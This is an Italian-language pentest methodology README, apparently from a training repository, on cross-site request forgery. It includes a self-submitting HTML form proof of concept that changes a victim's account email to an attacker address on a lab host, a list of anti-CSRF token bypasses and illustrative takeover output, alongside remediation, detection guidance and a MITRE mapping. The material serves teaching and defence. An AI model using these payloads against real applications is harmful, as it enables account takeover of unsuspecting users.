> [English](README.en.md) | **Italiano**

# CSRF - Cross-Site request forgery

> - **Fase:** Web exploitation - OWASP A01:2021 Broken Access Control
> - **Visibilita:** Bassa - la richiesta parte dal browser della vittima e appare legittima lato server
> - **Prerequisiti:** un'azione che cambia stato (cambio email/password, trasferimento, modifica impostazioni) protetta solo dal cookie di sessione, senza un token anti-CSRF valido o `SameSite`
> - **Natura del documento:** metodologia + payload pratici per ambiente di laboratorio. Nessun Finding ID fabbricato (prossimo `WEB-016`, da assegnare in lab).

- Obiettivo: indurre il browser della vittima autenticata a inviare, a sua insaputa, una richiesta che cambia stato sull'applicazione (es. cambio email/password).

---

## Executive summary

La CSRF sfrutta il fatto che il browser allega automaticamente i cookie di sessione a ogni richiesta verso
un'origine, anche se la richiesta parte da un sito terzo. Se un'azione che cambia stato e protetta solo dalla
sessione (senza token anti-CSRF ne `SameSite`), un sito dell'attaccante puo far partire quella richiesta dal
browser della vittima loggata. L'impatto dipende dall'azione: dal cambio impostazioni fino all'account takeover
(cambio email + reset password). Severity tipica `Medio`, `Alto` quando porta a takeover.

## Esecuzione / comandi

### PoC: form auto-inviante (azione POST)

Pagina ospitata dall'attaccante; appena la vittima (loggata sul target) la apre, il form parte da solo:

```html
<form action="https://target.lab/account/email" method="POST" id="x">
  <input type="hidden" name="email" value="attacker@evil.lab">
</form>
<script>document.getElementById('x').submit();</script>  <!-- cambia l'email dell'account della vittima -->
```

### Bypass comuni della protezione token

```
# token assente / non validato lato server -> si rimuove e la richiesta passa
# token prevedibile o riusabile -> si riusa un token noto
# token legato all'utente ma non alla sessione -> si usa il proprio token sulla vittima
# content-type JSON ma accetta text/plain -> form CSRF con enctype=text/plain che forgia il body JSON
```

Output illustrativo:

```
HTTP/1.1 302 Found   # l'azione e stata eseguita con la sessione della vittima
# email dell'account cambiata in attacker@evil.lab -> presa di controllo via reset password
```

## Analisi dei risultati

Se l'azione va a buon fine senza interazione consapevole della vittima, la CSRF e confermata. L'impatto sale ad
`Alto`/account takeover quando l'azione e cambio email/password. Se l'app richiede un token anti-CSRF legato
alla sessione o imposta `SameSite=Lax/Strict`, il vettore e chiuso.

### Analisi teorica

La CSRF e un problema di **autorizzazione ambientale**: il server autentica in base a qualcosa che il browser
invia automaticamente (il cookie), non in base alla prova che sia stato l'utente a volere l'azione. La
contromisura e richiedere una prova non allegata automaticamente: un token anti-CSRF per-sessione, e/o cookie
`SameSite`, e la conferma per le azioni sensibili.

## Remediation (blue team)

**Rilevamento.** Richieste che cambiano stato con `Referer`/`Origin` esterni o assenti; picchi di azioni
sensibili senza il token atteso.

**Hardening.** Token anti-CSRF per-sessione validato lato server; cookie `SameSite=Lax` (o `Strict`);
ri-autenticazione per azioni critiche; non usare GET per azioni che cambiano stato.

## Tool di riferimento

| tool | tipo | tecnica/accesso | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `Burp Suite` | proxy/scanner | web - attivo | genera il poc csrf e verifica la validazione del token |
| `curl` | client http | cli - attivo | test della richiesta senza token / con token alterato |

## Mappatura MITRE ATT&CK

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| initial access | exploit public-facing application | `T1190` | abuso di un'azione che cambia stato priva di protezione anti-csrf. |
| initial access | phishing: spearphishing link | `T1566.002` | consegna alla vittima del link alla pagina che innesca la richiesta forgiata. |

---

## Correlazioni con altri finding

| provenienza | questa tecnica | effetto |
| :--- | :--- | :--- |
| [xss](<../xss (Cross-Site Scripting)/README.md>) | csrf | una xss sul target bypassa qualsiasi difesa csrf (stessa origine) |
| csrf | [secure-coding-lab](<../../06-secure-coding-lab (Defense)/README.md>) | la remediation (token, samesite) si collega al secure coding |

---

> **Nota:** Contenuto didattico. I PoC vanno usati solo su applicazioni di proprieta o con autorizzazione esplicita, in laboratorio. Output illustrativi.
